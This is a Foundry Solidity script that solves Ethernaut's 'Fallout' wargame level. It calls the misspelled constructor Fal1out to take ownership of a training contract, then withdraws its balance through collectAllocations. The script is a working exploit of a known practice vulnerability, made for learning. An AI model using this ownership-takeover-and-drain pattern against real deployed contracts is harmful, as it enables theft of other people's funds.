// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "../src/Fallout/Fallout.sol";

// Copy address instance from Ethernaut:
address constant LEVEL_INSTANCE = 0x9C85199f9B6a85F4805696C921288E7567feE1E0;

contract FalloutScript is Script {
    function setUp() public {}

    function run() public {
        console.log(" # Running Level 2 Script");
        console.log(" |- msg.sender: ",msg.sender);


        Fallout fo = Fallout(payable(LEVEL_INSTANCE));

        address owner = fo.owner();
        uint256 ownerBalance = fo.allocatorBalance(owner);
        uint256 playerBalance = fo.allocatorBalance(msg.sender);
        console.log(" |- Level owner: ", owner);
        console.log(" |- Owner balance: ", ownerBalance);
        console.log(" |- msg.sender balance: ", playerBalance);
        
        vm.startBroadcast();

        
        // Call the misspelled constructor to pwn the contract
        fo.Fal1out{value: 1 wei}();
        
        playerBalance = fo.allocatorBalance(msg.sender);
        console.log(" |- msg.sender balance: ", playerBalance);

        // Check if contract has a new owner
        owner = fo.owner();
        console.log(" |- Level owner: ", owner);

        // Make sure the contract is pwned
        require(owner == msg.sender, " ##### Contract still not pwned! ##### ");

        uint256 contractBalance = address(LEVEL_INSTANCE).balance;
        console.log(" |- Contract balance: ", contractBalance);

        // Withdraw the funds 8o)
        fo.collectAllocations();

        contractBalance = address(LEVEL_INSTANCE).balance;
        console.log(" |- Contract balance: ", contractBalance);

        vm.stopBroadcast();

        console.log(" `- End of Level");

    }
}
